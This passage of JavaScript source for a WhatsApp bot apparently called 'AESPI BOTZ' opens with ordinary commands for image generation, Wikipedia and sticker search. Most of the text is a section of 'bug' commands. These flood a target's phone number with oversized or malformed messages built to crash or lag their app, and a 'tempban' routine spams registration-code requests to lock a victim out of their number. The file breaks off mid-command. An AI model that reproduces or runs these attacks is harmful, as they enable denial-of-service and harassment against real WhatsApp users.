                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return replygcaespisp(`*Example:* ${prefix + command} blue sky`)
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygcaespisp("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcaespisp("`GPT Not Responding`")
  }
}
break
case 'wikipedia': case 'wiki': {
	if (!text) return replygcaespisp(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygcaespisp('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcaespisp("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcaespisp("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygcaespisp("*Error: Could not track the anime or send the video.*");
  }
};
break
case 'stickersearch': {
if (!text) return replygcaespisp(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'apksearch': {
if (!text) return replygcaespisp(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    ArielStore.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcaespisp(`Total Features of ${botname} is ${aespispfeature()}`)
        break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               ArielStore.sendMessage(sender, { text: b }, { quoted: ftroli })
               replygcaespisp('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygcaespisp(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'areact': {
//asia
if (!m.quoted) return replygcaespisp(`Example usage: ${prefix + command} reply chat`)
await ArielStore.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363282476141407@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await ArielStore.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'abug2': {
if (!args[0]) return replygcaespisp(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
amount = text * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363282476141407@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'abug': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} Nomor|Jumlah\nContoh ${prefix+command} 91xxxxxxxxxx|5`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363282476141407@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'iosbug2': {
//asia
if (!text) return replygcaespisp(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await ArielStore.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case 'iosbug': {
//asia
if (!text) return replygcaespisp(`Example:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await ArielStore.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'aaudio2': {
//asia
if (!text) return replygcaespisp(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: 'arielkece@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'aaudio': {
//asia
if (!text) return replygcaespisp(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: 'arielkece@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'asticker': {
//asia
if (!text) return replygcaespisp(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'asticker2': {
//asia
if (!text) return replygcaespisp(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await ArielStore.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'aloc2': {
//asia
if (!text) return replygcaespisp(`Example: ${prefix + command} 5`)
amount = text
aespispOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
ArielStore.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${aespispOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'aloc': {
//asia
if (!text) return replygcaespisp(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
aespispOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
ArielStore.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${aespispOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'alist': {
//asia
if (!text) return replygcaespisp(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
replygcaespisp(`Successfully Sent Bug To ${victim}`)
}
break
case 'alist2': {
//asia
if (!text) return replygcaespisp(`Example:\n${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await ArielStore.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case 'tempban': {
//asia
if (!text) return replygcaespisp(`Example: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return replygcaespisp(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./src/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replygcaespisp(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./src/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'iosq':{
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
ArielStore.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": aespitext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
ArielStore.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: aespitext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle2': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
ArielStore.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: aespitext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcaespisp(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'aioscrash':
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
ArielStore.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'aioscrash2':{
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
ArielStore.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcaespisp(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'acrash':{
//asia
 if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
ArielSPCrashy(pushname,victim)
await sleep(3000)
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'acrash2':
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
ArielSPCrashy(pushname,m.chat)
await sleep(3000)
}
replygcaespisp(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = `${aespitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = `${aespitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = `${aespitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = aespitext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": ArielSPbug1,
}
}), { userJid: from, quoted : m})
ArielStore.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
//asia
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
ArielStore.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcaespisp(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
//asia
 if (!args[0]) return replygcaespisp(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let aespispgc = await ArielStore.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const ArielSPbug1 = `${aespitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
